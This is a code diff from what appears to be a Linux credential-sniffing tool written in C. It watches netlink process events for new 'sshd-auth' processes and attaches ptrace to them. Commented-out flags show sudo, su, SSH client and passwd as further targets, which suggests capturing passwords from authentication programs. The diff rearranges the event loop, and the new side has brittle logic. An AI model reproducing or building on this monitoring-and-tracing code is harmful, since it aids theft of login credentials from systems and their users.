@@ -38,18 +38,15 @@ char *get_command_from_pid(pid_t pid) {
     cmd_name[strcspn(cmd_name, "\n")] = 0;
 
     fclose(fp);
-
-    // Debug: Print the command name to verify it's correct
-    //printf("Fetched command name: %s\n", cmd_name);
-
     return cmd_name;
 }
 
 
 
+
+
 void childsig(int x) {
-  //fprintf(stderr, "[-] Plisteneter %d has been killed %d\n", getpid(), x);
-  debug("[DEBUG] Plisteneter %d has been killed %d\n", getpid(), x);
+  fprintf(stderr, "[-] Plisteneter %d has been killed %d\n", getpid(), x);
   exit(0);
 }
 
@@ -111,6 +108,7 @@ int set_proc_ev_listen(int nl_sock, bool enable) {
 }
 
 int handle_proc_ev(int nl_sock) {
+  pid_t child = 0;
   int rc = 0;
 
   struct __attribute__ ((aligned(NLMSG_ALIGNTO))) {
@@ -125,72 +123,55 @@ int handle_proc_ev(int nl_sock) {
 
   while (1) {
     rc = recv(nl_sock, &nlcn_msg, sizeof(nlcn_msg), 0);
-    //added the below if and commented out the original
-    if (rc <= 0) 
-    //if (rc == 0 || rc == -1)
-    continue;
-    //added this through
-    if (nlcn_msg.proc_ev.what != PROC_EVENT_EXEC)
-     continue;
-    pid_t pid = nlcn_msg.proc_ev.event_data.id.process_pid;
-    char *cmd_name = get_command_from_pid(pid);
 
-    if (cmd_name == NULL)
+    if (rc == 0 || rc == -1)
       continue;
 
-    if (strcmp(cmd_name, "sshd-auth") == 0) {
-      printf("[+] Detected sshd-auth process: PID %d\n", pid);
-
-    // Wait until the process is fully exec'd into sshd-auth
-    for (int i = 0; i < 10; i++) {
-        char *confirm_name = get_command_from_pid(pid);
-        if (confirm_name && strcmp(confirm_name, "sshd-auth") == 0) {
-            break;
-        }
-        usleep(100000); // wait 100ms before retry
-    }
-
-      pid_t child = fork();
-      if (child == 0) {
-      //fprintf(stderr, "[DEBUG] In child process. About to trace PID %d\n", pid);
-      debug("[DEBUG] In child process. About to trace PID %d\n", pid);
-      // In child: attach trace to sshd-auth 
-      trace_process(pid);
-      //fprintf(stderr, "[DEBUG] Trace process returned; This is bad\n");
-      debug("[DEBUG] Trace process returned.\n");
-        exit(0);
-      } else if (child > 0) {
-        //fprintf(stderr, "[DEBUG] Forked child process with PID %d\n", child);
-        debug("[DEBUG] Forked child process with PID: %d\n", child);
-    } else {
-        perror("[-] Fork failed");
-    }
-}
-}
-}
-      //this
-
-//      switch (nlcn_msg.proc_ev.what) {
-//      case PROC_EVENT_EXEC:
-//      char *cmd_name = get_command_from_pid(nlcn_msg.proc_ev.event_data.id.process_pid);
-//      if (cmd_name == NULL) {
-//          //return 0;
-//          continue;
-//      }
+    switch (nlcn_msg.proc_ev.what) {
+      case PROC_EVENT_EXEC:
+      char *cmd_name = get_command_from_pid(nlcn_msg.proc_ev.event_data.id.process_pid);
+      if (cmd_name == NULL) {
+          return 0;
+      }
 
       // Log the command name (optional for debugging)
-//      printf("New process spawned: %s\n", cmd_name);
-//      if (strcmp(cmd_name, "sshd-auth") == 0 || strcmp(cmd_name, "sudo") == 0) {
-//           printf("New process spawned: %s\n", cmd_name);
-//           trace_process(nlcn_msg.proc_ev.event_data.id.process_pid);
-//      }
-//      break;
+      printf("New process spawned: %s\n", cmd_name);
+      // Check if the process is an sshd-auth process
+      if (strcmp(cmd_name, "sshd-auth") == 0) {
+          // Now you can attach ptrace to this process
+          trace_process(nlcn_msg.proc_ev.event_data.id.process_pid);
+      }
 
-//    default:
-//      break;
-//    }
-//  }
-//}
+        //Do this check here so we don't spawn a process for nothing
+//        if (!ENABLE_SUDO && !ENABLE_SU && !ENABLE_SSH_CLIENT && !ENABLE_PASSWD)
+//          break;
+
+//        child = fork();
+//        if (child == 0) {
+//          trace_process(nlcn_msg.proc_ev.event_data.id.process_pid);
+//          exit(0);
+//        }
+        break;
+      case PROC_EVENT_UID:
+        //Do this check here so we don't spawn a process for nothing
+//        if (!ENABLE_SSH)
+          break;
+
+//	char *cmd_name = get_command_from_proc_event(&nlcn_msg.proc_ev);
+
+//        if (strstr(cmd_name, "sshd-auth") != NULL) {
+//	  child = fork();
+//          if (child == 0) {
+//            trace_process(nlcn_msg.proc_ev.event_data.id.process_pid);
+//            exit(0);
+//	  }
+//        }
+        break;
+      default:
+        break;
+    }
+  }
+}
 
 void plisten(void) {
   int nl_sock = 0;
